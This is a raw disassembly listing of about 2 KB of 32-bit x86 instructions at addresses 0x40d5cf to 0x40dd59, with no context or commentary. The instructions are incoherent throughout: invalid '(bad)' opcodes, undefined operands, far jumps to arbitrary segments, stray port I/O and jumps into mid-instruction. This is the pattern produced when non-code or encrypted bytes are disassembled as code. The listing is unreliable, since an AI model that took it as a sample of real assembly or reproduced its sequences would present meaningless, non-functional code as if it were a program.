  40d5cf:	or     ah,BYTE PTR [eax]
  40d5d1:	lock inc esp
  40d5d3:	bound  esi,QWORD PTR [ebp+0x54c768ca]
  40d5d9:	sbb    eax,0xe54f4c96
  40d5df:	xchg   ecx,eax
  40d5e0:	mov    ebx,0xfa4036fc
  40d5e5:	daa    
  40d5e6:	mov    ecx,DWORD PTR [esi+0x53]
  40d5e9:	test   al,0x90
  40d5eb:	mov    eax,0x605e5554
  40d5f0:	fisub  DWORD PTR [eax-0x2f]
  40d5f3:	jmp    0x293a:0x86e3cdd9
  40d5fa:	add    al,0xcf
  40d5fc:	xor    edi,0x8a2f9ab0
  40d602:	push   esp
  40d603:	ins    BYTE PTR es:[edi],dx
  40d604:	in     eax,0x3f
  40d606:	scas   eax,DWORD PTR es:[edi]
  40d607:	dec    ecx
  40d608:	int    0x7
  40d60a:	mov    ch,bh
  40d60c:	mov    ecx,0xa3bf1f89
  40d611:	icebp  
  40d612:	xchg   esp,eax
  40d613:	cld    
  40d614:	imul   DWORD PTR [esi-0x7c]
  40d617:	mov    dh,BYTE PTR [ebx+0x3e]
  40d61a:	inc    edx
  40d61b:	or     DWORD PTR [ebx+0x3583552a],esp
  40d621:	lock xchg ecx,eax
  40d623:	and    ecx,esi
  40d625:	fst    QWORD PTR [esi+0x6c62817f]
  40d62b:	(bad)  
  40d62c:	mov    ebx,0xba446dc1
  40d631:	add    ebp,DWORD PTR [ecx+0x7]
  40d634:	stos   DWORD PTR es:[edi],eax
  40d635:	mov    esp,0x43396250
  40d63a:	bound  esp,QWORD PTR [esi]
  40d63c:	sub    eax,DWORD PTR [ebx+0x1f6e0be0]
  40d642:	inc    eax
  40d643:	xchg   ebx,eax
  40d644:	outs   dx,BYTE PTR ds:[esi]
  40d645:	mov    ah,0x1c
  40d647:	(bad)  
  40d648:	fsub   QWORD PTR [edi+0x39]
  40d64b:	test   BYTE PTR [ebx-0x4],ch
  40d64e:	fstp   QWORD PTR [eax]
  40d650:	stc    
  40d651:	mov    al,ds:0xeff232d0
  40d656:	shl    BYTE PTR [ebp+0x2b],1
  40d659:	fst    QWORD PTR [eax+0x37]
  40d65c:	jmp    0x23cd910e
  40d661:	ins    DWORD PTR es:[edi],dx
  40d662:	out    dx,eax
  40d663:	std    
  40d664:	ja     0x40d66c
  40d666:	fimul  DWORD PTR [ebx]
  40d668:	aad    0xd3
  40d66a:	lock sahf 
  40d66c:	sub    al,0x8c
  40d66e:	jne    0x40d6e9
  40d670:	pop    ds
  40d671:	in     eax,0xeb
  40d673:	push   ecx
  40d674:	mov    edi,DWORD PTR [esi+0x7]
  40d677:	lock iret 
  40d679:	xchg   edx,eax
  40d67a:	arpl   WORD PTR [ebp+0x25],bp
  40d67d:	nop
  40d67e:	or     DWORD PTR [ebp+0x30],0x3c69ece6
  40d685:	rcr    BYTE PTR [edi+eax*1],0xd6
  40d689:	test   BYTE PTR [edx-0x20f4108e],dl
  40d68f:	scas   eax,DWORD PTR es:[edi]
  40d690:	push   edx
  40d691:	sub    eax,0x4f5e9061
  40d696:	retf   0x882a
  40d699:	outs   dx,DWORD PTR ds:[esi]
  40d69a:	fidiv  DWORD PTR [edi+ebx*1-0x5b]
  40d69e:	ficomp DWORD PTR [ebx]
  40d6a0:	mov    edi,0xa6dde347
  40d6a5:	das    
  40d6a6:	pop    edi
  40d6a7:	js     0x40d65b
  40d6a9:	xchg   DWORD PTR [edx+0x3369368c],esi
  40d6af:	add    BYTE PTR [esi-0x48f71caf],0x8e
  40d6b6:	cld    
  40d6b7:	stc    
  40d6b8:	and    ebp,esi
  40d6ba:	in     eax,0xb2
  40d6bc:	xchg   BYTE PTR [eax+0x631c176b],dh
  40d6c2:	dec    edx
  40d6c3:	imul   ebx,edx,0xe53189df
  40d6c9:	aam    0xaa
  40d6cb:	mov    al,0xed
  40d6cd:	cmp    DWORD PTR [esi-0x26],edi
  40d6d0:	icebp  
  40d6d1:	loopne 0x40d662
  40d6d3:	pop    eax
  40d6d4:	ins    BYTE PTR es:[edi],dx
  40d6d5:	cli    
  40d6d6:	xlat   BYTE PTR ds:[ebx]
  40d6d7:	shr    BYTE PTR [edi-0x35],0xa0
  40d6db:	mov    ecx,0x4d5995b7
  40d6e0:	xchg   edx,eax
  40d6e1:	neg    BYTE PTR [edi+ebx*4]
  40d6e4:	sub    eax,0xcdce4a16
  40d6e9:	ins    BYTE PTR es:[edi],dx
  40d6ea:	inc    eax
  40d6eb:	cmp    DWORD PTR [edi+0x14],0xffffffb3
  40d6ef:	stos   BYTE PTR es:[edi],al
  40d6f0:	add    al,0xb4
  40d6f2:	das    
  40d6f3:	mov    eax,es
  40d6f5:	lods   al,BYTE PTR ds:[esi]
  40d6f6:	jmp    0x40d6cd
  40d6f8:	scas   al,BYTE PTR es:[edi]
  40d6f9:	loop   0x40d759
  40d6fb:	mov    bl,0xcd
  40d6fd:	dec    eax
  40d6fe:	loope  0x40d733
  40d700:	add    BYTE PTR [edx+0x79],cl
  40d703:	fdivr  st,st(7)
  40d705:	test   bl,cl
  40d707:	adc    DWORD PTR [ebx+eiz*4-0x6a],0x1f140084
  40d70f:	clc    
  40d710:	clc    
  40d711:	cmp    DWORD PTR [edi-0x32],edx
  40d714:	mov    ebp,0xf572c0ed
  40d719:	leave  
  40d71a:	add    DWORD PTR [ecx],ecx
  40d71c:	jmp    0x40d76c
  40d71e:	dec    edi
  40d71f:	movntps XMMWORD PTR [ebx+0x78326e96],xmm3
  40d726:	and    al,0xb4
  40d728:	mov    ds,WORD PTR ds:0xc6ee1e2e
  40d72e:	adc    al,0xe1
  40d730:	fisttp DWORD PTR [esi]
  40d732:	cdq    
  40d733:	add    BYTE PTR [eax+0x56ab2341],dl
  40d739:	xor    BYTE PTR [eax-0x3eee25f5],al
  40d73f:	outs   dx,DWORD PTR ds:[esi]
  40d740:	cdq    
  40d741:	mov    edi,0xc60e79bd
  40d746:	ret    
  40d747:	add    BYTE PTR [ebx+0x690d6a55],bl
  40d74d:	popf   
  40d74e:	repnz push ecx
  40d750:	fucomp st(6)
  40d752:	push   ds
  40d753:	pusha  
  40d754:	and    al,0x29
  40d756:	adc    DWORD PTR [ecx+0x1017ddf7],0x4f
  40d75d:	add    DWORD PTR [esi+0x4eb6ab03],edx
  40d763:	mov    DWORD PTR cs:[ebx+ecx*4-0x5d],esi
  40d768:	cli    
  40d769:	or     edx,edi
  40d76b:	fisttp DWORD PTR [ebp-0x1f]
  40d76e:	imul   ecx,DWORD PTR ds:0xa3f125aa,0xcbbd7647
  40d778:	ss inc eax
  40d77a:	adc    al,0x24
  40d77c:	data16 rol BYTE PTR [ecx],0xc6
  40d780:	pop    ss
  40d781:	push   ds
  40d782:	sbb    ch,bh
  40d784:	jae    0x40d76f
  40d786:	jcxz   0x40d77f
  40d789:	stos   DWORD PTR es:[edi],eax
  40d78a:	sahf   
  40d78b:	inc    edi
  40d78c:	xchg   ebp,eax
  40d78d:	popa   
  40d78e:	mov    ds:0xdae75caa,eax
  40d793:	mov    al,ds:0x45b75ef2
  40d798:	outs   dx,BYTE PTR ds:[esi]
  40d799:	lea    esp,[esi-0x343fd903]
  40d79f:	pop    ebx
  40d7a0:	mov    ch,0x56
  40d7a2:	inc    ebx
  40d7a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7a4:	mov    edi,0x72547115
  40d7a9:	cli    
  40d7aa:	enter  0x58a8,0xa6
  40d7ae:	fst    DWORD PTR [ecx]
  40d7b0:	jb     0x40d781
  40d7b2:	sub    ch,BYTE PTR [edi-0x6e]
  40d7b5:	push   ecx
  40d7b6:	out    dx,al
  40d7b7:	setl   BYTE PTR [esi+ebx*1+0x447498f4]
  40d7bf:	adc    eax,0x2cf97718
  40d7c4:	movntq QWORD PTR [edi+0x5eb41c1d],mm2
  40d7cb:	pusha  
  40d7cc:	mov    ?,WORD PTR [ebx+ebp*1+0x412a17f5]
  40d7d3:	adc    eax,0x8bc0b56
  40d7d8:	cmp    ebp,DWORD PTR [edi-0x2c0dd000]
  40d7de:	out    0x7f,al
  40d7e0:	rcr    DWORD PTR [edx],1
  40d7e2:	push   ecx
  40d7e3:	push   0xfffffffd
  40d7e5:	inc    ebx
  40d7e6:	ds push cs
  40d7e8:	and    al,0x29
  40d7ea:	and    edi,DWORD PTR [esi+0x15630e8b]
  40d7f0:	jecxz  0x40d803
  40d7f2:	xor    bl,BYTE PTR [edx+0x500c0646]
  40d7f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7f9:	adc    eax,0x569285d4
  40d7fe:	arpl   WORD PTR [edx-0x75ef3664],ax
  40d804:	or     bl,BYTE PTR [edx-0x740ee292]
  40d80a:	add    eax,0xff2c33d
  40d80f:	xor    ah,ah
  40d811:	or     eax,0x8cc8a4a3
  40d816:	xchg   ecx,eax
  40d817:	xor    eax,0xf5f6fbba
  40d81c:	pop    edi
  40d81d:	arpl   WORD PTR [ecx],di
  40d81f:	lahf   
  40d820:	sahf   
  40d821:	lock ja 0x40d7a4
  40d824:	loope  0x40d864
  40d826:	mov    ch,0xa2
  40d828:	shl    DWORD PTR [ebx+0x3a],1
  40d82b:	add    eax,0x34f1315f
  40d830:	lods   eax,DWORD PTR ds:[esi]
  40d831:	mov    dl,0xb7
  40d833:	adc    DWORD PTR [edx+0x2],ecx
  40d836:	mov    DWORD PTR [ecx+0x24],eax
  40d839:	out    0xc5,al
  40d83b:	sub    al,0xa0
  40d83d:	push   edi
  40d83e:	jmp    0x40d8bb
  40d840:	push   ebp
  40d841:	and    esp,ebx
  40d843:	inc    edx
  40d844:	xchg   esi,eax
  40d846:	cmp    BYTE PTR [ebx],0xc4
  40d849:	sub    eax,0xcb45bb1f
  40d84e:	out    dx,eax
  40d84f:	mov    dh,0xa6
  40d851:	mov    al,0xa7
  40d853:	ret    0xc2b2
  40d856:	call   0x6fa9aa46
  40d85b:	push   edx
  40d85c:	mov    ch,0xec
  40d85e:	xchg   esp,eax
  40d85f:	outs   dx,DWORD PTR ds:[esi]
  40d860:	dec    edi
  40d861:	clc    
  40d862:	lahf   
  40d863:	ss mov esi,0xea2edb62
  40d869:	xchg   edx,eax
  40d86a:	arpl   WORD PTR [ebx],ax
  40d86c:	mov    ds:0xb1bf0be6,al
  40d871:	mov    dh,BYTE PTR [ebx]
  40d873:	nop
  40d874:	and    BYTE PTR [ebx+0x7b786762],bh
  40d87a:	fistp  QWORD PTR [bx+0x1935]
  40d87f:	xor    DWORD PTR [ebp+0x16],edi
  40d882:	call   ecx
  40d884:	jp     0x40d85f
  40d886:	iret   
  40d887:	xor    bl,BYTE PTR [edi-0x17]
  40d88a:	shl    DWORD PTR [edx],cl
  40d88c:	outs   dx,BYTE PTR ds:[esi]
  40d88d:	push   ds
  40d88e:	adc    esi,ebp
  40d890:	pushf  
  40d891:	imul   esi,DWORD PTR [ecx],0x619ed574
  40d897:	push   esi
  40d898:	out    0x57,al
  40d89a:	mov    DWORD PTR [esi],esp
  40d89c:	dec    eax
  40d89d:	cmp    eax,0xf099c0c0
  40d8a2:	iret   
  40d8a3:	scas   al,BYTE PTR es:[edi]
  40d8a4:	add    eax,0x2fc91568
  40d8a9:	push   es
  40d8aa:	xchg   edi,eax
  40d8ab:	je     0x40d832
  40d8ad:	mov    ah,0x38
  40d8af:	xchg   ebp,eax
  40d8b0:	push   0x6667a231
  40d8b5:	add    al,0x7
  40d8b7:	das    
  40d8b8:	shl    BYTE PTR [ebx-0xf01aa3c],1
  40d8be:	dec    edx
  40d8bf:	out    dx,al
  40d8c0:	ja     0x40d86a
  40d8c2:	add    al,dl
  40d8c4:	mov    al,0x55
  40d8c6:	mov    dl,0x50
  40d8c8:	and    DWORD PTR [ebp+0x6aca3e33],edx
  40d8ce:	lds    esi,FWORD PTR [ecx-0x1fab1d6c]
  40d8d4:	fld    DWORD PTR [edi+0x11]
  40d8d7:	xchg   ebp,eax
  40d8d8:	repz add al,BYTE PTR [esi+0x13]
  40d8dc:	or     eax,0x658fccbd
  40d8e1:	cmp    BYTE PTR [edx],ch
  40d8e3:	pop    ebx
  40d8e4:	es push es
  40d8e6:	retf   0x97f6
  40d8e9:	dec    edi
  40d8ea:	or     BYTE PTR [ebx],dh
  40d8ec:	aad    0xa1
  40d8ee:	push   edi
  40d8ef:	xor    ecx,DWORD PTR [ecx-0x255d5b8b]
  40d8f5:	stos   BYTE PTR es:[edi],al
  40d8f6:	jmp    0x4510:0xed3f4a70
  40d8fd:	jb     0x40d966
  40d8ff:	push   ebx
  40d900:	xchg   edx,eax
  40d901:	cdq    
  40d902:	mov    ebx,0x6b469bac
  40d907:	mov    ebp,0xe43dd709
  40d90c:	jb     0x40d89a
  40d90e:	in     eax,0xd0
  40d910:	push   edi
  40d911:	arpl   WORD PTR [edi+0x4f],si
  40d914:	xchg   edi,eax
  40d915:	cld    
  40d916:	pushw  0x8b56
  40d91a:	mov    al,ds:0xc67a1a46
  40d91f:	mov    dh,0x31
  40d921:	add    cl,bh
  40d923:	jmp    0xe0d5:0xea4de1fe
  40d92a:	and    ebp,esi
  40d92c:	gs sbb al,0x74
  40d92f:	dec    esi
  40d930:	in     al,dx
  40d931:	sub    edx,ebx
  40d933:	dec    edx
  40d934:	leave  
  40d935:	das    
  40d936:	jb     0x40d979
  40d938:	xchg   esp,eax
  40d939:	loopne 0x40d99c
  40d93b:	rcr    DWORD PTR [ebx],0x9d
  40d93e:	sahf   
  40d93f:	xor    BYTE PTR ds:0x70aceb2c,bh
  40d945:	push   edx
  40d946:	outs   dx,BYTE PTR ds:[esi]
  40d947:	sbb    cl,bl
  40d949:	lock mov edx,0x50b7f1b4
  40d94f:	sbb    al,BYTE PTR [ebp-0x10]
  40d952:	sahf   
  40d953:	push   ds
  40d954:	scas   eax,DWORD PTR es:[edi]
  40d955:	xor    eax,DWORD PTR [ebp+0x377e1a76]
  40d95b:	push   ecx
  40d95c:	retf   
  40d95d:	xchg   BYTE PTR [ebx+0x45],ah
  40d960:	mov    eax,0x49c326e3
  40d965:	adc    al,0xad
  40d967:	mov    bl,0xde
  40d969:	sbb    DWORD PTR [edx+edi*4],esp
  40d96c:	popf   
  40d96d:	scas   eax,DWORD PTR es:[edi]
  40d96e:	loopne 0x40d9bf
  40d970:	jbe    0x40d925
  40d972:	inc    esi
  40d973:	mov    dl,0x68
  40d975:	mov    al,ds:0x552f0342
  40d97a:	aas    
  40d97b:	loope  0x40d93e
  40d97d:	jns    0x40d9b3
  40d97f:	pop    eax
  40d980:	aam    0xef
  40d982:	fisttp DWORD PTR [edi+edi*4]
  40d985:	cmc    
  40d986:	mov    eax,ds:0x55d9569a
  40d98b:	lahf   
  40d98c:	add    esp,DWORD PTR [esp+eax*4-0x71]
  40d990:	pop    ecx
  40d991:	xlat   BYTE PTR ds:[ebx]
  40d992:	sbb    DWORD PTR [ecx],ebx
  40d994:	inc    esp
  40d995:	mov    ds:0xc26610a8,al
  40d99a:	fld    QWORD PTR [esi+0x6c]
  40d99d:	loope  0x40d953
  40d99f:	loop   0x40da12
  40d9a1:	nop
  40d9a2:	inc    eax
  40d9a3:	add    eax,0xa97d224e
  40d9a8:	addr16 pop eax
  40d9aa:	dec    ecx
  40d9ab:	xchg   BYTE PTR [ebx-0xdc4b371],cl
  40d9b1:	xchg   ebx,eax
  40d9b2:	add    DWORD PTR [esi-0x27],edi
  40d9b5:	push   edx
  40d9b6:	fdivr  DWORD PTR [edi+0x461f1642]
  40d9bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9bd:	add    eax,0x16e62da4
  40d9c2:	ins    DWORD PTR es:[edi],dx
  40d9c3:	cmc    
  40d9c4:	fidiv  DWORD PTR ds:0x7002d858
  40d9ca:	jg     0x40d957
  40d9cc:	fmul   QWORD PTR [eax-0x23]
  40d9cf:	xlat   BYTE PTR ds:[ebx]
  40d9d0:	mov    cl,0xef
  40d9d2:	inc    edx
  40d9d3:	add    BYTE PTR [edi+esi*2-0xc599c22],dl
  40d9da:	xchg   ecx,eax
  40d9db:	lods   al,BYTE PTR ds:[esi]
  40d9dc:	push   esp
  40d9dd:	jae    0x40da47
  40d9df:	sbb    DWORD PTR [edi],eax
  40d9e1:	and    eax,edi
  40d9e3:	xchg   esi,eax
  40d9e4:	mov    esp,DWORD PTR [ebp-0x71]
  40d9e7:	aas    
  40d9e8:	push   edx
  40d9e9:	ficom  DWORD PTR [esi+eax*1]
  40d9ec:	sub    BYTE PTR [eax+0x75],ch
  40d9ef:	pop    ebp
  40d9f0:	mov    esp,0x3eb5c50a
  40d9f5:	cmp    eax,eax
  40d9f7:	dec    eax
  40d9f8:	rol    BYTE PTR [eax+0x4c99882b],1
  40d9fe:	not    BYTE PTR [ebx]
  40da00:	dec    ebx
  40da01:	mov    cl,0x42
  40da03:	or     eax,0x7bd85ef6
  40da08:	js     0x40da5d
  40da0a:	cmp    eax,0x8227901d
  40da0f:	mov    ds:0x4a758ff2,al
  40da14:	enter  0xecb3,0xa4
  40da18:	(bad)  
  40da19:	jae    0x40da17
  40da1b:	(bad)  
  40da1c:	cmp    DWORD PTR [edi-0x4f86da3a],edi
  40da22:	jp     0x40da82
  40da24:	ins    DWORD PTR es:[edi],dx
  40da25:	mov    ah,0xed
  40da27:	ror    BYTE PTR [ebx],1
  40da29:	mov    esi,0xd1084977
  40da2e:	xor    al,BYTE PTR [edx-0x282ec507]
  40da34:	popa   
  40da35:	dec    eax
  40da36:	jp     0x40da9e
  40da38:	add    BYTE PTR [ecx],bl
  40da3a:	scas   al,BYTE PTR es:[edi]
  40da3b:	popa   
  40da3c:	cmp    ecx,DWORD PTR ds:0x34e22d9f
  40da42:	mov    edx,0x8ba03f9a
  40da47:	in     eax,dx
  40da48:	cmp    eax,0x81efc14e
  40da4d:	adc    BYTE PTR [esi-0x55],dh
  40da50:	imul   edi,DWORD PTR [edi+0x63],0xffffff99
  40da54:	nop
  40da55:	push   ebp
  40da56:	sti    
  40da57:	xor    DWORD PTR [esi+0x4b6ea40b],eax
  40da5d:	retf   
  40da5e:	push   edi
  40da5f:	sbb    DWORD PTR ds:0xc5d70946,0x3f2817df
  40da69:	nop
  40da6a:	mov    esi,0x400d6c42
  40da6f:	dec    ecx
  40da70:	lds    ebx,FWORD PTR ss:[ebx]
  40da73:	add    al,0xb5
  40da75:	pop    eax
  40da76:	add    DWORD PTR [esi-0x591c6d12],eax
  40da7c:	xchg   ebp,eax
  40da7d:	out    dx,eax
  40da7e:	loope  0x40da83
  40da80:	push   ss
  40da81:	mov    ebp,0x591ba905
  40da86:	sub    al,0x1a
  40da88:	lods   eax,DWORD PTR ds:[esi]
  40da89:	and    al,0x6e
  40da8b:	cmp    DWORD PTR [edx-0x73922335],esi
  40da91:	stos   BYTE PTR es:[edi],al
  40da92:	out    dx,eax
  40da93:	xchg   BYTE PTR [eax+edx*4],al
  40da96:	push   0x2eb34477
  40da9b:	pop    DWORD PTR [edx-0x26]
  40da9e:	sbb    DWORD PTR [ebp+ecx*8-0x65],0xbf1067c9
  40daa6:	call   0xa4a00f8c
  40daab:	das    
  40daac:	sbb    bl,BYTE PTR [ebp-0x45]
  40daaf:	mov    ebp,0x10f51fbc
  40dab4:	mov    ah,0x10
  40dab6:	fnstcw WORD PTR [esi+ecx*8-0xc470917]
  40dabd:	es aas 
  40dabf:	test   eax,0x911271a
  40dac4:	nop
  40dac5:	fimul  DWORD PTR [eax+eax*4+0x71a6e59b]
  40dacc:	mov    dh,0xcb
  40dace:	sti    
  40dacf:	sbb    DWORD PTR [esi-0x57],edi
  40dad2:	inc    edi
  40dad3:	imul   BYTE PTR [ebp-0x6e97f7f3]
  40dad9:	inc    ebx
  40dada:	or     ch,ah
  40dadc:	(bad)  
  40dadd:	xchg   ebx,eax
  40dade:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dadf:	jmp    0x40db59
  40dae1:	lahf   
  40dae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dae3:	jl     0x40db5a
  40dae5:	cmp    ecx,DWORD PTR [ecx-0x65eb8f30]
  40daeb:	lea    edx,[ebx-0x733407c7]
  40daf1:	dec    esi
  40daf2:	mov    ds:0xca2a5d93,eax
  40daf7:	scas   eax,DWORD PTR es:[edi]
  40daf8:	and    DWORD PTR [ebp+0x34],edi
  40dafb:	or     al,0xb
  40dafd:	mov    ds:0x1b6243e3,eax
  40db02:	pushf  
  40db03:	sbb    ch,al
  40db05:	push   edi
  40db06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db07:	pop    ecx
  40db08:	adc    al,0x21
  40db0b:	test   eax,0xbde18bc4
  40db10:	xor    BYTE PTR [ebp-0xc8fa231],0x4b
  40db17:	adc    eax,0x484374db
  40db1c:	lods   al,BYTE PTR ds:[esi]
  40db1d:	nop
  40db1e:	lahf   
  40db1f:	lahf   
  40db20:	aad    0xac
  40db22:	int3   
  40db23:	mov    bh,0xee
  40db25:	jmp    0x6076:0x8a68f365
  40db2c:	out    dx,eax
  40db2d:	ret    
  40db2e:	dec    eax
  40db2f:	sub    BYTE PTR [esi],bl
  40db31:	mov    al,0x9e
  40db33:	icebp  
  40db34:	mov    esp,0x232dd4b
  40db39:	sar    DWORD PTR [ecx+0x3f676375],1
  40db3f:	jmp    0xab1a4a69
  40db44:	mov    al,0x74
  40db46:	aad    0xa7
  40db48:	push   0x58
  40db4a:	jo     0x40daef
  40db4c:	pop    ecx
  40db4d:	xchg   BYTE PTR [edx-0x4d],dl
  40db50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db51:	fstp   TBYTE PTR [edi]
  40db53:	rcr    BYTE PTR [edx-0x46],cl
  40db56:	cmp    edx,DWORD PTR [edx+0x5e]
  40db59:	out    0xb1,al
  40db5b:	(bad)  [edx+esi*2+0x132d3b67]
  40db62:	ret    
  40db63:	dec    ebx
  40db64:	dec    ecx
  40db65:	cmp    al,0x92
  40db67:	scas   eax,DWORD PTR es:[edi]
  40db68:	mov    ch,0x66
  40db6a:	repz retf 
  40db6c:	dec    ecx
  40db6d:	mov    edx,0x8428d70b
  40db72:	cmp    esp,ecx
  40db74:	pop    ebx
  40db75:	in     al,dx
  40db76:	fwait
  40db77:	xor    bl,dh
  40db79:	leave  
  40db7a:	fimul  WORD PTR ds:0x18b9effd
  40db80:	jne    0x40db12
  40db82:	fldz   
  40db84:	jg     0x40db43
  40db86:	daa    
  40db87:	mov    DWORD PTR [esi+0x26],ebp
  40db8a:	push   cs
  40db8b:	aas    
  40db8c:	jmp    0xaba8:0x6a1270fc
  40db93:	jmp    0xb092:0xf0a5028b
  40db9a:	cwde   
  40db9b:	es pop ecx
  40db9d:	pop    ebx
  40db9e:	out    0x65,al
  40dba0:	sub    DWORD PTR [eax-0x41],ebx
  40dba3:	in     eax,dx
  40dba4:	(bad)  
  40dba6:	fiadd  WORD PTR [edx+0x76b5af70]
  40dbac:	and    eax,ebp
  40dbae:	jge    0x40dbb4
  40dbb0:	out    dx,eax
  40dbb1:	mov    dh,BYTE PTR [ebx-0x1a6d10fc]
  40dbb7:	inc    esi
  40dbb8:	call   FWORD PTR [eax]
  40dbba:	add    al,0x2e
  40dbbc:	loop   0x40db97
  40dbbe:	mov    ebp,0x7c102556
  40dbc3:	sar    BYTE PTR [esi+ecx*8+0x402b583c],0xef
  40dbcb:	js     0x40db73
  40dbcd:	or     ax,0x1e8f
  40dbd1:	dec    edi
  40dbd2:	inc    ebx
  40dbd3:	mov    esp,0x9c3e3e45
  40dbd8:	push   ebp
  40dbd9:	mov    ch,0x73
  40dbdb:	cdq    
  40dbdc:	int3   
  40dbdd:	loope  0x40db71
  40dbdf:	sub    dh,BYTE PTR [ebx]
  40dbe1:	push   esp
  40dbe2:	mov    ?,WORD PTR ds:0xe70cc19f
  40dbe8:	push   edx
  40dbe9:	xchg   ecx,eax
  40dbea:	and    BYTE PTR [eax-0x2d4889fe],ah
  40dbf0:	dec    eax
  40dbf1:	push   ebp
  40dbf2:	(bad)  
  40dbf3:	(bad)  
  40dbf4:	sti    
  40dbf5:	(bad)  
  40dbf7:	dec    ebp
  40dbf8:	jecxz  0x40dbae
  40dbfa:	cdq    
  40dbfb:	ror    DWORD PTR [esp+edi*8],0x1e
  40dbff:	in     eax,dx
  40dc00:	sub    DWORD PTR [ebx+ecx*8],eax
  40dc03:	dec    eax
  40dc04:	mov    ds:0xa1ad1334,al
  40dc09:	add    al,0x79
  40dc0b:	imul   edi,eax,0xffffffd2
  40dc0e:	mov    ch,0x7c
  40dc10:	std    
  40dc11:	lods   al,BYTE PTR ds:[esi]
  40dc12:	in     eax,dx
  40dc13:	dec    edx
  40dc14:	call   0xa5293723
  40dc19:	je     0x40dc2e
  40dc1b:	js     0x40dc5a
  40dc1d:	imul   ebp,DWORD PTR [esi+0x5c77a8be],0xffffff9d
  40dc24:	cld    
  40dc25:	jl     0x40dc41
  40dc27:	add    eax,0x9d4d5409
  40dc2c:	xor    ecx,eax
  40dc2e:	(bad)  
  40dc30:	das    
  40dc31:	ins    DWORD PTR es:[edi],dx
  40dc32:	add    al,0xa7
  40dc34:	lods   eax,DWORD PTR ds:[esi]
  40dc35:	rcl    DWORD PTR [esi],1
  40dc37:	jl     0x40dc2f
  40dc39:	mov    DWORD PTR [edi],0x2ee3283
  40dc3f:	xchg   DWORD PTR [ebx],ebp
  40dc41:	fadd   DWORD PTR [eax]
  40dc43:	cmp    BYTE PTR [esi],bl
  40dc45:	cdq    
  40dc46:	shl    BYTE PTR [esi+0x4ef3386c],1
  40dc4c:	fisub  WORD PTR [eax+0x1fafe217]
  40dc52:	call   0xf078c209
  40dc57:	aam    0xeb
  40dc59:	(bad)  
  40dc5b:	xor    DWORD PTR [esi+edx*1],edx
  40dc5e:	push   esi
  40dc5f:	cmp    ch,BYTE PTR [ecx]
  40dc61:	cmp    bl,BYTE PTR [edi-0x65]
  40dc64:	mov    al,ds:0x94fe4564
  40dc69:	adc    al,0xef
  40dc6b:	mov    edi,0xf5a16647
  40dc70:	jbe    0x40dc68
  40dc72:	call   0xe1e0:0x3d0a633f
  40dc79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc7a:	jge    0x40dc4c
  40dc7c:	fdiv   st,st(5)
  40dc7e:	xchg   ecx,eax
  40dc7f:	mov    ch,0x6f
  40dc81:	lds    edi,FWORD PTR [ebp+0x7c]
  40dc84:	loope  0x40dcdc
  40dc86:	retf   0x559
  40dc89:	push   ds
  40dc8a:	adc    eax,0x6d223695
  40dc8f:	test   al,0x21
  40dc91:	bound  ebp,QWORD PTR [ecx-0x7e]
  40dc94:	adc    eax,DWORD PTR [ebx-0x43]
  40dc97:	cdq    
  40dc98:	mov    dh,0x98
  40dc9a:	or     eax,0x8c2a3b4f
  40dc9f:	and    al,0x79
  40dca1:	idiv   ah
  40dca3:	mov    edx,0xeb6ba7cb
  40dca8:	(bad)  
  40dca9:	xchg   edx,eax
  40dcaa:	jmp    0x3f279a28
  40dcaf:	loope  0x40dd00
  40dcb1:	stos   BYTE PTR es:[edi],al
  40dcb2:	cdq    
  40dcb3:	xlat   BYTE PTR ds:[ebx]
  40dcb4:	sbb    al,0x11
  40dcb6:	outs   dx,DWORD PTR gs:[esi]
  40dcb8:	xchg   DWORD PTR [ecx],esp
  40dcba:	sub    eax,0x46e1cef1
  40dcbf:	icebp  
  40dcc0:	loope  0x40dcd2
  40dcc2:	sbb    eax,0x1f53536a
  40dcc7:	loop   0x40dd1c
  40dcc9:	inc    eax
  40dcca:	jns    0x40dcda
  40dccc:	scas   al,BYTE PTR es:[edi]
  40dccd:	clc    
  40dcce:	dec    edx
  40dccf:	cmp    BYTE PTR [ebx-0x6],ch
  40dcd2:	aas    
  40dcd3:	dec    ecx
  40dcd4:	mov    eax,ds:0x2c1aba98
  40dcd9:	cmc    
  40dcda:	sbb    edx,DWORD PTR [esi+0x2f89b868]
  40dce0:	cld    
  40dce1:	fisttp DWORD PTR [edi+0x6b]
  40dce4:	aaa    
  40dce5:	loope  0x40dc6b
  40dce7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dce8:	call   0xf7156aa7
  40dced:	mov    WORD PTR [esi+0x8e3ccda],fs
  40dcf3:	popf   
  40dcf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcf5:	push   0x26f76770
  40dcfa:	sbb    al,0x2d
  40dcfc:	dec    ebx
  40dcfd:	adc    bh,BYTE PTR [ecx+0x5992e7c5]
  40dd03:	inc    esp
  40dd04:	mov    eax,0xc0a456ff
  40dd09:	and    BYTE PTR [ebx+0x475a5028],ah
  40dd0f:	push   ds
  40dd10:	test   al,0x9f
  40dd12:	call   0x8222f95b
  40dd17:	imul   eax,DWORD PTR [esi+0x1777f2d7],0x1
  40dd1e:	jnp    0x40dd28
  40dd20:	stos   DWORD PTR es:[edi],eax
  40dd21:	dec    ebx
  40dd22:	aam    0x4b
  40dd24:	aas    
  40dd25:	lds    ecx,FWORD PTR [ebx-0x3d]
  40dd28:	ins    BYTE PTR es:[edi],dx
  40dd29:	inc    ebp
  40dd2a:	sbb    dh,al
  40dd2c:	mov    ds:0x65aebab7,eax
  40dd31:	push   0xc7451c59
  40dd36:	and    DWORD PTR [esi-0x25c7bdea],esp
  40dd3c:	pop    ecx
  40dd3d:	out    dx,al
  40dd3e:	clc    
  40dd3f:	dec    edx
  40dd40:	test   ecx,edx
  40dd42:	mov    ah,0x8f
  40dd44:	cmp    ah,BYTE PTR [ecx-0x29963dae]
  40dd4a:	add    ah,dl
  40dd4c:	mov    bh,0x44
  40dd4e:	xchg   esi,eax
  40dd4f:	cmp    eax,0x4ea772f7
  40dd54:	mov    ds:0xe49e6635,al
  40dd59:	or     edi,eax
